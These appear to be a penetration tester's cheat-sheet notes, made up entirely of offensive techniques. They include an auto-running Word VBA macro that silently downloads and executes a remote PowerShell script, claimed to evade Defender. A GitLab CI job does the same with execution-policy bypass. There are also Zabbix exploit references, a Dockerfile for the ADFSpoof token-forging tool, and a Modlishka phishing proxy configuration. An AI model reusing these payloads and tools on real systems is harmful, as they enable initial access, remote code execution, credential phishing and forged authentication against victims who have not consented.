defender does not catch on
// additional


```
' Macro
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://10.10.14.87/test.ps1') | IEX"
    Shell str, vbHide
End Sub
```

script to get comand exec

```
stages:
  - build

build-code-job:
  stage: build
  tags:
    - windows
    - powershell
  script:
    - cmd.exe /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.12/test.ps1')"
```

zabbix 

 https://github.com/Diefunction/ZabbixAPIAbuse and https://www.exploit-db.com/exploits/39937 and the metasploit exploit/multi/http/zabbix_script_exec



ADFSPOOF Docker

FROM python:3.8.0-buster

RUN apt update && apt install -y faketime
RUN git clone https://github.com/dmb2168/cryptography.git && cd cryptography && pip install -e .
RUN git clone https://github.com/mandiant/ADFSpoof.git && cd ADFSpoof && pip install -r requirements.txt

WORKDIR /ADFSpoof

Drop that into a file called Dockerfile and run
docker build . -t adfspoof

to create adfspoof image. Launch the container and run bash in it with
docker -it --rm -v $(pwd):/keys adfspoof /bin/bash

Then you just run python3 ADFSpoof.py with faketime inside the container with your secret files in /keys

timestamp

┌──(root㉿kali)-[~]
└─# date -d @proxychains ldapsearch -LLL -x -H ldap://192.168.20.10 -b '' -s base '(objectclass=*)' | grep -i currentTime | awk -F\: {'print $2'} | awk -F\. {'print $1'} | sed 's/^ *//g'| awk '{$NF=""}1'

modlishka json

```
└─# cat modlishka.json      
{
  "proxyDomain": "00security.com",
  "listeningAddress": "10.x.x.x",

  "target": "spy.0x0security.com",
  "targetResources": "",
  "targetRules": "",
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules":"",
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": true,
  "logPostOnly": false,
  "disableSecurity": true,
  "log": "**requests.log"**,           <--------------------------------------
  "plugins": "all",
  "cert": "",
  "certKey": "",
  "certPool": ""
}
```
